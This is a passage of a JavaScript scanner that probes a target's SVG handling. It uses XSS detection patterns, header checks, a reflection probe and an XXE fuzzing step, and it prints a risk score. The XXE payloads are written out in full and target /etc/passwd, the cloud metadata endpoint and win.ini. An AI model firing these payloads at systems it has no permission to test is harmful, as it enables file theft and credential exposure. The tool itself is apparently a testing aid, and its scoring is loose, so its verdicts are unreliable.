      [/insertBefore\(/i, 'Node insertion'],
      [/querySelector\(/i, 'Query selector'],
      [/querySelectorAll\(/i, 'Query selector all'],
      [/getElementById\(/i, 'Element by ID'],
      [/getElementsByClassName\(/i, 'Elements by class'],
      [/getElementsByTagName\(/i, 'Elements by tag'],
      [/getElementsByName\(/i, 'Elements by name'],
      [/createElement\(/i, 'Element creation'],
      [/createDocumentFragment\(/i, 'Document fragment'],
      [/createAttribute\(/i, 'Attribute creation'],
      [/setAttribute\(/i, 'Attribute setting'],
      [/getAttribute\(/i, 'Attribute getting'],
      [/removeAttribute\(/i, 'Attribute removal'],
      [/hasAttribute\(/i, 'Attribute check'],
      [/classList\./i, 'Class list'],
      [/style\./i, 'Style manipulation'],
      [/dataset\./i, 'Dataset access'],
      [/textContent/i, 'Text content'],
      [/innerText/i, 'Inner text'],
      [/outerHTML/i, 'Outer HTML'],
      [/insertAdjacentHTML\(/i, 'Adjacent HTML insertion'],
      [/insertAdjacentElement\(/i, 'Adjacent element insertion'],
      [/insertAdjacentText\(/i, 'Adjacent text insertion'],
      [/focus\(/i, 'Focus'],
      [/blur\(/i, 'Blur'],
      [/click\(/i, 'Click'],
      [/submit\(/i, 'Submit'],
      [/reset\(/i, 'Reset'],
      [/scrollTo\(/i, 'Scroll to'],
      [/scrollBy\(/i, 'Scroll by'],
      [/scrollIntoView\(/i, 'Scroll into view'],
      [/getBoundingClientRect\(/i, 'Bounding client rect'],
      [/getClientRects\(/i, 'Client rects'],
      [/matches\(/i, 'Matches selector'],
      [/closest\(/i, 'Closest selector'],
      [/contains\(/i, 'Contains node'],
      [/compareDocumentPosition\(/i, 'Document position'],
      [/isEqualNode\(/i, 'Node equality'],
      [/isSameNode\(/i, 'Same node'],
      [/normalize\(/i, 'Normalize'],
      [/isConnected/i, 'Node connection'],
      [/isDefaultNamespace\(/i, 'Default namespace'],
      [/lookupNamespaceURI\(/i, 'Namespace URI'],
      [/lookupPrefix\(/i, 'Namespace prefix'],
      [/requestFullscreen\(/i, 'Fullscreen request'],
      [/exitFullscreen\(/i, 'Fullscreen exit'],
      [/requestPointerLock\(/i, 'Pointer lock'],
      [/webkitRequestFullscreen\(/i, 'WebKit fullscreen'],
      [/mozRequestFullScreen\(/i, 'Moz fullscreen'],
      [/msRequestFullscreen\(/i, 'MS fullscreen'],
      [/webkitExitFullscreen\(/i, 'WebKit exit fullscreen'],
      [/mozCancelFullScreen\(/i, 'Moz cancel fullscreen'],
      [/msExitFullscreen\(/i, 'MS exit fullscreen'],
      [/releasePointerCapture\(/i, 'Pointer capture'],
      [/hasPointerCapture\(/i, 'Pointer capture check'],
      [/dragDrop\(/i, 'Drag and drop'],
      [/requestAnimationFrame\(/i, 'Animation frame'],
      [/cancelAnimationFrame\(/i, 'Cancel animation frame'],
      [/webkitRequestAnimationFrame\(/i, 'WebKit animation frame'],
      [/mozRequestAnimationFrame\(/i, 'Moz animation frame'],
      [/msRequestAnimationFrame\(/i, 'MS animation frame'],
      [/webkitCancelAnimationFrame\(/i, 'WebKit cancel animation frame'],
      [/mozCancelAnimationFrame\(/i, 'Moz cancel animation frame'],
      [/msCancelAnimationFrame\(/i, 'MS cancel animation frame'],
      [/performance\./i, 'Performance API'],
      [/crypto\./i, 'Crypto API'],
      [/indexedDB/i, 'IndexedDB'],
      [/webkitIndexedDB/i, 'WebKit IndexedDB'],
      [/mozIndexedDB/i, 'Moz IndexedDB'],
      [/msIndexedDB/i, 'MS IndexedDB'],
      [/IDBDatabase/i, 'IDBDatabase'],
      [/IDBObjectStore/i, 'IDBObjectStore'],
      [/IDBTransaction/i, 'IDBTransaction'],
      [/IDBIndex/i, 'IDBIndex'],
      [/IDBCursor/i, 'IDBCursor'],
      [/IDBKeyRange/i, 'IDBKeyRange'],
      [/IDBRequest/i, 'IDBRequest'],
      [/IDBOpenDBRequest/i, 'IDBOpenDBRequest'],
      [/IDBVersionChangeEvent/i, 'IDBVersionChangeEvent'],
      [/Blob\(/i, 'Blob constructor'],
      [/File\(/i, 'File constructor'],
      [/FileReader\(/i, 'FileReader'],
      [/URL\./i, 'URL API'],
      [/URLSearchParams\(/i, 'URLSearchParams'],
      [/FormData\(/i, 'FormData'],
      [/Headers\(/i, 'Headers'],
      [/Request\(/i, 'Request'],
      [/Response\(/i, 'Response'],
      [/AbortController\(/i, 'AbortController'],
      [/AbortSignal\(/i, 'AbortSignal'],
      [/Event\(/i, 'Event constructor'],
      [/CustomEvent\(/i, 'CustomEvent'],
      [/MessageEvent\(/i, 'MessageEvent'],
      [/Promise\(/i, 'Promise'],
      [/Proxy\(/i, 'Proxy'],
      [/Reflect\./i, 'Reflect'],
      [/Symbol\(/i, 'Symbol'],
      [/Map\(/i, 'Map'],
      [/Set\(/i, 'Set'],
      [/WeakMap\(/i, 'WeakMap'],
      [/WeakSet\(/i, 'WeakSet'],
      [/ArrayBuffer\(/i, 'ArrayBuffer'],
      [/DataView\(/i, 'DataView'],
      [/Int8Array\(/i, 'Int8Array'],
      [/Uint8Array\(/i, 'Uint8Array'],
      [/Uint8ClampedArray\(/i, 'Uint8ClampedArray'],
      [/Int16Array\(/i, 'Int16Array'],
      [/Uint16Array\(/i, 'Uint16Array'],
      [/Int32Array\(/i, 'Int32Array'],
      [/Uint32Array\(/i, 'Uint32Array'],
      [/Float32Array\(/i, 'Float32Array'],
      [/Float64Array\(/i, 'Float64Array'],
      [/BigInt64Array\(/i, 'BigInt64Array'],
      [/BigUint64Array\(/i, 'BigUint64Array'],
      [/SharedArrayBuffer\(/i, 'SharedArrayBuffer'],
      [/Atomics\./i, 'Atomics'],
      [/WebAssembly\./i, 'WebAssembly'],
      [/JSON\./i, 'JSON'],
      [/Math\./i, 'Math'],
      [/Date\(/i, 'Date'],
      [/RegExp\(/i, 'RegExp'],
      [/Error\(/i, 'Error'],
      [/EvalError\(/i, 'EvalError'],
      [/RangeError\(/i, 'RangeError'],
      [/ReferenceError\(/i, 'ReferenceError'],
      [/SyntaxError\(/i, 'SyntaxError'],
      [/TypeError\(/i, 'TypeError'],
      [/URIError\(/i, 'URIError'],
      [/AggregateError\(/i, 'AggregateError'],
      [/Intl\./i, 'Intl'],
      [/Array\./i, 'Array'],
      [/Object\./i, 'Object'],
      [/String\./i, 'String'],
      [/Number\./i, 'Number'],
      [/Boolean\./i, 'Boolean'],
      [/Function\./i, 'Function'],
      [/Generator\(/i, 'Generator'],
      [/GeneratorFunction\(/i, 'GeneratorFunction'],
      [/AsyncFunction\(/i, 'AsyncFunction'],
      [/AsyncGenerator\(/i, 'AsyncGenerator'],
      [/AsyncGeneratorFunction\(/i, 'AsyncGeneratorFunction'],
      [/PromiseRejectionEvent\(/i, 'PromiseRejectionEvent'],
      [/PromiseSettledResultArray\(/i, 'PromiseSettledResultArray'],
      [/ReadableStream\(/i, 'ReadableStream'],
      [/WritableStream\(/i, 'WritableStream'],
      [/TransformStream\(/i, 'TransformStream'],
      [/TextEncoder\(/i, 'TextEncoder'],
      [/TextDecoder\(/i, 'TextDecoder'],
      [/queueMicrotask\(/i, 'queueMicrotask'],
      [/structuredClone\(/i, 'structuredClone'],
      [/globalThis\./i, 'globalThis'],
      [/this\./i, 'this'],
      [/arguments\[/i, 'Arguments'],
      [/with\s*\(/i, 'With statement'],
      [/debugger/i, 'Debugger'],
      [/import\s*\(/i, 'Dynamic import'],
      [/export\s*{/i, 'Export'],
      [/from\s+["\']/i, 'Import from'],
      [/require\s*\(/i, 'Require'],
      [/module\s*\./i, 'Module'],
      [/exports\s*\./i, 'Exports'],
      [/__dirname/i, 'Dirname'],
      [/__filename/i, 'Filename'],
      [/process\./i, 'Process'],
      [/Buffer\./i, 'Buffer'],
      [/setImmediate\(/i, 'setImmediate'],
      [/clearImmediate\(/i, 'clearImmediate'],
      [/child_process\./i, 'Child process'],
      [/fs\./i, 'File system'],
      [/path\./i, 'Path'],
      [/os\./i, 'OS'],
      [/util\./i, 'Util'],
      [/stream\./i, 'Stream'],
      [/events\./i, 'Events'],
      [/http\./i, 'HTTP'],
      [/https\./i, 'HTTPS'],
      [/net\./i, 'Net'],
      [/dns\./i, 'DNS'],
      [/url\./i, 'URL'],
      [/querystring\./i, 'Query string'],
      [/zlib\./i, 'Zlib'],
      [/crypto\./i, 'Crypto'],
      [/tls\./i, 'TLS'],
      [/dgram\./i, 'Datagram'],
      [/cluster\./i, 'Cluster'],
      [/worker_threads\./i, 'Worker threads'],
      [/vm\./i, 'VM'],
      [/perf_hooks\./i, 'Performance hooks'],
      [/async_hooks\./i, 'Async hooks'],
      [/inspector\./i, 'Inspector'],
      [/v8\./i, 'V8'],
      [/trace_events\./i, 'Trace events'],
      [/assert\./i, 'Assert'],
      [/constants\./i, 'Constants'],
      [/timers\./i, 'Timers'],
      [/console\./i, 'Console'],
      [/domain\./i, 'Domain'],
      [/punycode\./i, 'Punycode'],
      [/string_decoder\./i, 'String decoder'],
      [/tty\./i, 'TTY'],
      [/readline\./i, 'Readline'],
      [/repl\./i, 'REPL'],
      [/module\./i, 'Module'],
    ];

    RAW_PATTERNS.forEach(([re, msg]) => {
      if (re.test(body)) {
        log.w(msg);
        score += 1;
      }
    });

    // --- Check for obfuscated <script> tags ---
    if (/<script[^>]+>.*?<\/script>/is.test(body)) {
      log.v('Inline <script> detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for JavaScript in SVG attributes ---
    if (/<[^>]+on\w+\s*=/i.test(body)) {
      log.v('Inline event handler detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for data: URIs ---
    if (/<[^>]+[^>]+data:text\/html/i.test(body)) {
      log.v('HTML data URI detected');
      score += 3;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for JavaScript URIs ---
    if (/<[^>]+[^>]+javascript:/i.test(body)) {
      log.v('JavaScript URI detected');
      score += 3;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for CDATA sections ---
    if (/<!\[CDATA\[.*?\]\]>/is.test(body)) {
      log.v('CDATA section detected');
      score += 1;
    }

    // --- Check for Base64-encoded scripts ---
    if (/base64[^"]+"[^"]*script/i.test(body)) {
      log.v('Base64-encoded script detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for external script includes ---
    if (/<script[^>]+src=["'][^"']+["']/i.test(body)) {
      log.v('External script include detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for eval() usage ---
    if (/eval\(/i.test(body)) {
      log.v('eval() usage detected');
      score += 3;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for document.write() usage ---
    if (/document\.write\(/i.test(body)) {
      log.v('document.write() usage detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // --- Check for innerHTML usage ---
    if (/innerHTML/i.test(body)) {
      log.v('innerHTML usage detected');
      score += 2;
      detectedVulnerabilities.xss = true;
    }

    // ==================================================
    // SANITIZER RESILIENCE
    // ==================================================
    log.h('SANITIZER & PARSER MISMATCH');

    const MARKER = 'sl0ppyr00t-x0xr00t';
    const injected = body.replace(/<svg/i, `<svg data-proof="${MARKER}"`);
    const testDom = new JSDOM(`<body>${injected}</body>`);

    if (testDom.window.document.querySelector(`[data-proof="${MARKER}"]`)) {
      log.v('SVG attributes survive DOM insertion');
      score += 3;
    } else {
      log.ok('Attribute stripping observed');
    }

    // ==================================================
    // SERVER SIDE – DELIVERY INTELLIGENCE
    // ==================================================
    log.h('SERVER‑SIDE – DELIVERY & PIPELINE');

    const SECURITY_HEADERS = [
      'content-security-policy', 'x-content-type-options', 'x-frame-options',
      'x-xss-protection', 'strict-transport-security', 'referrer-policy',
      'feature-policy', 'permissions-policy', 'expect-ct',
      'cross-origin-opener-policy', 'cross-origin-resource-policy',
      'cross-origin-embedder-policy', 'content-security-policy-report-only',
      'access-control-allow-origin', 'access-control-allow-methods',
      'access-control-allow-headers', 'access-control-allow-credentials',
      'access-control-expose-headers', 'access-control-max-age',
      'timing-allow-origin', 'clear-site-data'
    ];

    log.i(`Content-Type: ${headers['content-type'] || 'missing'}`);

    SECURITY_HEADERS.forEach(header => {
      if (!headers[header.toLowerCase()]) {
        log.w(`Missing security header: ${header}`);
        score += 0.5;
      }
    });

    if (!headers['content-security-policy']) {
      log.w('No CSP');
      score += 1;
    }

    if (!headers['x-content-type-options']) {
      log.w('MIME sniffing risk');
      score += 1;
    }

    if (/image\/svg\+xml/.test(headers['content-type'] || '')) {
      log.i('Served as SVG image');
    } else {
      log.w('SVG served with non‑SVG MIME');
      score += 1;
    }

    // Reflection (safe probe)
    try {
      const u = new URL(target);
      u.searchParams.set('scan', MARKER);
      const r2 = await fetchWithBypass(u.toString());
      if ((await r2.text()).includes(MARKER)) {
        log.v('Backend reflects user input');
        score += 3;
      }
    } catch (e) {
      log.w(`Reflection test failed: ${e.message}`);
    }

    // ==================================================
    // SERVER SIDE – FUZZING & CHAINED PAYLOADS
    // ==================================================
    log.h('SERVER‑SIDE – FUZZING & CHAINED PAYLOADS');

    // Define payloads here (XXE_PAYLOADS, SSRF_PAYLOADS, etc.)
    const XXE_PAYLOADS = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg><text>&xxe;</text></svg>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><svg><text>&xxe;</text></svg>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><svg><text>&xxe;</text></svg>'
    ];

    // --- Test for XXE ---
    detectedVulnerabilities.xxe = await fuzzSVG(target, XXE_PAYLOADS, 'XXE');
    if (detectedVulnerabilities.xxe) {
      log.v('XXE vulnerability detected!');
      score += 5;
    }

    // --- Test for Delivery Pipeline ---
    detectedVulnerabilities.deliveryPipeline = await fuzzDeliveryPipeline(target);

    // ==================================================
    // IMPACT MODEL (NON‑EXECUTING)
    // ==================================================
    log.h('IMPACT & CHAIN FEASIBILITY');

    const possibleChains = testTheoreticalChains(detectedVulnerabilities);

    if (possibleChains.length > 0) {
      log.v('Possible attack chains:');
      possibleChains.forEach(chain => log.s(` • ${chain}`));
    } else if (score >= 5) {
      log.w('Moderate attack surface – exploitability environment-dependent');
    } else {
      log.ok('Low observable risk');
    }

    // ==================================================
    // SCORE BREAKDOWN
    // ==================================================
    log.h('SCORE BREAKDOWN');

    if (score >= 9) {
      log.v('CRITICAL RISK: Immediate action required');
      log.v(' • High confidence in exploitability');
      log.v(' • Multiple attack chains possible');
      log.v(' • Likely to lead to RCE, data breach, or full compromise');
    } else if (score >= 7) {
      log.w('HIGH RISK: Urgent review recommended');
      log.v(' • Likely exploitability with chaining');
      log.v(' • Potential for data leakage or XSS');
    } else if (score >= 5) {
      log.w('MEDIUM RISK: Review recommended');
      log.v(' • Possible exploitability with specific conditions');
      log.v(' • May require user interaction or misconfiguration');
    } else if (score >= 3) {
      log.i('LOW RISK: Monitor and review');
      log.v(' • Minor issues detected');
      log.v(' • Unlikely to be exploitable without additional vulnerabilities');
    } else {
      log.ok('MINIMAL RISK: No significant issues detected');
    }

    log.h(`FINAL INTELLIGENCE SCORE: ${score}/10`);
  } catch (e) {
    log.w(`Error during scan: ${e.message}`);
  }
});
